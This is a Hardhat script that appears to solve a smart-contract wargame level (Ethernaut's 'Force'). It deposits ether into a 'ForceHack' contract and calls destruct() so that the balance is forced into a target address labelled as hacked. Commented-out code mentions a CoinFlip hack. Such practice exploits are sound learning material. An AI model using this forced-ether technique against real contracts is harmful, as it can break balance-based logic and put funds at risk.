const { ethers } = require("hardhat");
const hre = require("hardhat");

const main = async () => {
  /*const contractFactory = await hre.ethers.getContractFactory("ForceHack");
  const forceHack = await contractFactory.deploy();
  await forceHack.deployed();
  console.log("=== forceHack contract deployed to ", forceHack.address);
  */
  console.log("===CONNECTING===");
  const forceHackAddress = "0x25B51f2a5b6f334c9a1850096c5BCA3A4f3F6Ad3";
  const forceHackName = "ForceHack";
  const signer = await hre.ethers.getSigner();
  const forceHack = await hre.ethers.getContractAt(
    forceHackName,
    forceHackAddress,
    signer
  );
  console.log("depositing money");
  await forceHack.deposit({
    value: 100,
  });
  console.log(
    "forceHack balance",
    String(await hre.ethers.provider.getBalance(forceHack.address))
  );
  console.log("=== DESTRUCTING ===");
  await forceHack.destruct("0xb82b2cC7BC17333192A871D8d2b75f6660892A18");
  /*const hackContractAddress = "0xb82b2cC7BC17333192A871D8d2b75f6660892A18";
  const hackContractName = "CoinFlipHack";
  const signer = await hre.ethers.getSigner();
  const contract = await hre.ethers.getContractAt(
    hackContractName,
    hackContractAddress,
    signer
  );*/
  console.log(
    "hacked account balance",
    String(
      await hre.ethers.provider.getBalance(
        "0xb82b2cC7BC17333192A871D8d2b75f6660892A18"
      )
    )
  );
  console.log("=== DONE ===");
};

const runMain = (async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
})();
